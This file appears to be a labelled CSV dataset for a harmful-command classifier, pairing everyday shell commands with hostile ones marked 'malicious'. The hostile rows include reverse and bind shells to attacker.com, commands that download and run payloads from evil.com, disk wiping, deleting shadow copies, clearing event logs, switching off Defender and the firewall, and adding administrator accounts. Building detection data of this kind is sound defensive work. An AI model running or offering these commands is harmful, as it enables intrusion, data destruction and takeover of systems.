command,label
git pull origin main,benign
type ls,benign
free -m,benign
cat /dev/urandom > /dev/sda,malicious
top,benign
cat /etc/passwd,benign
sudo rsync -av /src/ /dst/,benign
nslookup google.com | head -5,benign
rmdir empty_folder,benign
mkdir -p /tmp/test,benign
nohup bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
usermod -aG sudo user,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
timeout 60 sc stop Windows Defender,malicious
curl -I https://google.com | head -5,benign
sudo kubectl get pods,benign
id user,benign
"timeout 60 perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
vmstat,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
sc stop Windows Defender,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe 2>&1,malicious
attrib +h +s malware.exe,malicious
docker images,benign
wevtutil cl System,malicious
id user,benign
ncat -lvp 443 -e cmd.exe >/dev/null,malicious
find /home -name '*.txt' -v,benign
rm -rf / >/dev/null,malicious
awk '{print $1}' data.txt > output.txt,benign
history,benign
nc -l -p 4444 -e /bin/bash,malicious
ncat -lvp 443 -e cmd.exe,malicious
w,benign
rmdir empty_folder | head -5,benign
rm -rf /,malicious
vssadmin delete shadows /all /quiet,malicious
pwd > output.txt,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
mshta javascript:alert('code execution'),malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
mkfs.ext4 /dev/sda1,malicious
curl -I https://google.com -v,benign
fdisk -l,benign
curl http://evil.com/payload.sh | bash,malicious
dd if=/dev/zero of=/dev/sda,malicious
echo 'Hello World',benign
chown user:group file.txt,benign
find /home -name '*.txt' 2>/dev/null,benign
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
netsh advfirewall set allprofiles state off,malicious
date,benign
passwd user,benign
useradd newuser,benign
net localgroup administrators hacker /add,malicious
docker ps,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS') &",malicious
msbuild project.csproj,benign
rm -rf /,malicious
netsh advfirewall set allprofiles state off >/dev/null,malicious
free -m,benign
wc -l document.txt,benign
lsblk,benign
(net localgroup administrators hacker /add),malicious
chmod 777 /etc/shadow,malicious
fdisk -l,benign
net localgroup administrators hacker /add,malicious
ncat -lvp 443 -e cmd.exe,malicious
git clone https://github.com/user/repo.git,benign
ss -tulpn,benign
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
ncat -lvp 443 -e cmd.exe,malicious
id user,benign
format C: /q /x,malicious
groups user -v,benign
:(){ :|:& };:,malicious
man ls -v,benign
curl http://evil.com/payload.sh | bash,malicious
sdelete -p 10 -s -z C:\,malicious
timeout 60 wmic process call create 'cmd.exe /c powershell.exe',malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
kubectl get pods,benign
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
rm -rf /,malicious
sc stop Windows Defender,malicious
mkfs.ext4 /dev/sda1,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
curl -I https://google.com,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
"python -c 'import os; os.system(""rm -rf /"")' >/dev/null",malicious
last,benign
type ls,benign
who,benign
type ls > output.txt,benign
find /home -name '*.txt',benign
whoami,benign
service apache2 status,benign
lsblk -v,benign
cp file1.txt file2.txt,benign
htop,benign
cipher /w:C:\,malicious
git clone https://github.com/user/repo.git > output.txt,benign
sc stop Windows Defender,malicious
curl -I https://google.com | head -5,benign
vmstat > output.txt,benign
htop --help,benign
who,benign
sdelete -p 10 -s -z C:\ >/dev/null,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
node --version,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe 2>&1,malicious
top -v,benign
taskkill /f /im antimalware.exe,malicious
python --version,benign
rsync -av /src/ /dst/ > output.txt,benign
find /home -name '*.txt',benign
format C: /q /x,malicious
dd if=/dev/zero of=/dev/sda,malicious
vssadmin delete shadows /all /quiet,malicious
history,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
chmod 777 /etc/shadow,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
date,benign
timeout 60 wmic process call create 'cmd.exe /c powershell.exe',malicious
mkdir -p /tmp/test,benign
git pull origin main 2>/dev/null,benign
cat /dev/urandom > /dev/sda,malicious
ping -c 4 google.com,benign
nslookup google.com --help,benign
fdisk -l,benign
format C: /q /x,malicious
which python --help,benign
tail -f /var/log/syslog,benign
shutdown /r /f /t 0,malicious
iptables -L,benign
"timeout 60 powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
cmd /c del /q /s C:\*,malicious
ping -c 4 google.com 2>/dev/null,benign
scp file.txt user@server:/path/,benign
timeout 60 bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
head -10 logfile.txt,benign
service apache2 status,benign
git pull origin main 2>/dev/null,benign
format C: /q /x,malicious
(vssadmin delete shadows /all /quiet),malicious
wget https://example.com/file.txt | head -5,benign
mshta javascript:alert('code execution'),malicious
curl http://evil.com/payload.sh | bash,malicious
cmd /c del /q /s C:\* >/dev/null,malicious
wget http://malicious.com/malware.exe,malicious
curl http://evil.com/payload.sh | bash,malicious
head -10 logfile.txt,benign
traceroute google.com,benign
cmd /c del /q /s C:\*,malicious
ps aux,benign
vmstat | head -5,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
docker ps,benign
wevtutil cl Security,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
python --version | head -5,benign
passwd user,benign
(nc -l -p 4444 -e /bin/bash),malicious
whoami,benign
nohup netsh advfirewall set allprofiles state off,malicious
timeout 60 cat /dev/urandom > /dev/sda,malicious
wc -l document.txt,benign
net user hacker password123 /add,malicious
wmic process call create 'cmd.exe /c powershell.exe',malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe &,malicious
net user hacker password123 /add,malicious
wevtutil cl System,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts 2>&1,malicious
mkdir -p /tmp/test -v,benign
chmod 777 /etc/shadow,malicious
csc -target:library file.cs > output.txt,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll --help,benign
:(){ :|:& };: &,malicious
echo 'virus' > /etc/passwd,malicious
sudo tar -czf backup.tar.gz /data,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
wevtutil cl System,malicious
attrib +h +s malware.exe,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
mkfs.ext4 /dev/sda1,malicious
kubectl get pods | head -5,benign
curl -I https://google.com --help,benign
sort data.txt,benign
git clone https://github.com/user/repo.git,benign
ncat -lvp 443 -e cmd.exe,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
cat /dev/urandom > /dev/sda,malicious
nc -l -p 4444 -e /bin/bash,malicious
nohup powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
top,benign
sudo traceroute google.com,benign
vssadmin delete shadows /all /quiet,malicious
shutdown /r /f /t 0,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' >/dev/null",malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= &,malicious
diskpart select disk 0 clean,malicious
sc stop Windows Defender 2>&1,malicious
nc -l -p 4444 -e /bin/bash,malicious
echo 'virus' > /etc/passwd,malicious
nohup :(){ :|:& };:,malicious
rsync -av /src/ /dst/,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 2>&1,malicious
sudo apt list --installed,benign
finger user,benign
netsh advfirewall set allprofiles state off,malicious
yum list installed,benign
who,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
head -10 logfile.txt,benign
wmic process call create 'cmd.exe /c powershell.exe' &,malicious
systemctl reload nginx | head -5,benign
who 2>/dev/null,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
grep pattern file.txt,benign
cmd /c del /q /s C:\*,malicious
chmod 777 /etc/shadow,malicious
diskpart select disk 0 clean,malicious
sudo java -version,benign
usermod -aG sudo user,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
mkdir -p /tmp/test,benign
ncat -lvp 443 -e cmd.exe,malicious
vssadmin delete shadows /all /quiet,malicious
nohup wmic process call create 'cmd.exe /c powershell.exe',malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
cipher /w:C:\,malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts >/dev/null,malicious
ping -c 4 google.com,benign
fdisk -l,benign
sdelete -p 10 -s -z C:\,malicious
sort data.txt,benign
python --version,benign
usermod -aG sudo user > output.txt,benign
wevtutil cl Security,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
nohup powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
wget https://example.com/file.txt,benign
rsync -av /src/ /dst/,benign
timeout 60 regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
cat /dev/urandom > /dev/sda,malicious
wc -l document.txt,benign
sdelete -p 10 -s -z C:\,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
service apache2 status,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
python --version,benign
crontab -l > output.txt,benign
"cut -d',' -f1 data.csv",benign
cipher /w:C:\ >/dev/null,malicious
tar -czf backup.tar.gz /data,benign
cmd /c del /q /s C:\* &,malicious
shutdown /r /f /t 0,malicious
mkfs.ext4 /dev/sda1,malicious
wget http://malicious.com/malware.exe,malicious
csc -target:library file.cs,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
chmod 755 script.sh,benign
nohup vssadmin delete shadows /all /quiet,malicious
wget http://malicious.com/malware.exe,malicious
find /home -name '*.txt',benign
cipher /w:C:\,malicious
echo 'virus' > /etc/passwd,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
nohup sc stop Windows Defender,malicious
find /home -name '*.txt' | head -5,benign
ping -c 4 google.com,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
net user hacker password123 /add,malicious
wevtutil cl System,malicious
(taskkill /f /im antimalware.exe),malicious
sc stop Windows Defender,malicious
java -version,benign
git pull origin main,benign
"(powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")')",malicious
"timeout 60 powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
timeout 60 net localgroup administrators hacker /add,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
taskkill /f /im antimalware.exe >/dev/null,malicious
(format C: /q /x),malicious
crontab -l | head -5,benign
diskpart select disk 0 clean,malicious
systemctl status nginx,benign
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
useradd newuser,benign
sdelete -p 10 -s -z C:\,malicious
find /home -name '*.txt',benign
systemctl reload nginx | head -5,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll > output.txt,benign
mkfs.ext4 /dev/sda1,malicious
systemctl status nginx > output.txt,benign
python --version,benign
timeout 60 nc -l -p 4444 -e /bin/bash,malicious
sudo usermod -aG sudo user,benign
uptime -v,benign
last | head -5,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
cmd /c del /q /s C:\* &,malicious
cat /dev/urandom > /dev/sda,malicious
date,benign
systemctl reload nginx,benign
docker images -v,benign
pip list,benign
umount /dev/sdb1,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
chmod 755 script.sh,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
uptime,benign
chmod 755 script.sh,benign
usermod -aG sudo user -v,benign
"cut -d',' -f1 data.csv",benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
nohup powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
ls -la,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
cat /dev/urandom > /dev/sda,malicious
netstat -tulpn,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
iostat,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
groups user -v,benign
history,benign
rmdir empty_folder,benign
who,benign
mv old.txt new.txt | head -5,benign
curl http://evil.com/payload.sh | bash,malicious
mkdir -p /tmp/test 2>/dev/null,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
chown user:group file.txt > output.txt,benign
wget http://malicious.com/malware.exe,malicious
format C: /q /x,malicious
taskkill /f /im antimalware.exe,malicious
timeout 60 echo 'virus' > /etc/passwd,malicious
ping -c 4 google.com,benign
attrib +h +s malware.exe &,malicious
touch newfile.txt,benign
free -m,benign
rmdir empty_folder,benign
cat /dev/urandom > /dev/sda,malicious
nslookup google.com,benign
sc stop Windows Defender,malicious
wevtutil cl Security,malicious
history,benign
dd if=/dev/zero of=/dev/sda,malicious
sudo mv old.txt new.txt,benign
du -sh /var/log,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
mkfs.ext4 /dev/sda1 &,malicious
(echo 'virus' > /etc/passwd),malicious
head -10 logfile.txt,benign
net user hacker password123 /add 2>&1,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
mkfs.ext4 /dev/sda1,malicious
date,benign
chown user:group file.txt > output.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
git clone https://github.com/user/repo.git,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
:(){ :|:& };:,malicious
userdel olduser,benign
net localgroup administrators hacker /add,malicious
tar -czf backup.tar.gz /data,benign
echo 'Hello World',benign
kubectl get pods,benign
htop,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' &",malicious
"timeout 60 rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
attrib +h +s malware.exe,malicious
sudo iostat,benign
chown user:group file.txt | head -5,benign
wevtutil cl Security,malicious
which python,benign
vmstat > output.txt,benign
timeout 60 diskpart select disk 0 clean,malicious
taskkill /f /im antimalware.exe >/dev/null,malicious
ping -c 4 google.com,benign
finger user > output.txt,benign
df -h,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
nc -l -p 4444 -e /bin/bash &,malicious
net localgroup administrators hacker /add &,malicious
netstat -tulpn,benign
"nohup ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")' &",malicious
ls -la > output.txt,benign
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
dd if=/dev/zero of=/dev/sda,malicious
htop,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
diskpart select disk 0 clean,malicious
useradd newuser | head -5,benign
who,benign
lsblk,benign
(diskpart select disk 0 clean),malicious
shutdown /r /f /t 0,malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
shutdown /r /f /t 0,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll | head -5,benign
diskpart select disk 0 clean,malicious
(wevtutil cl Security),malicious
diskpart select disk 0 clean,malicious
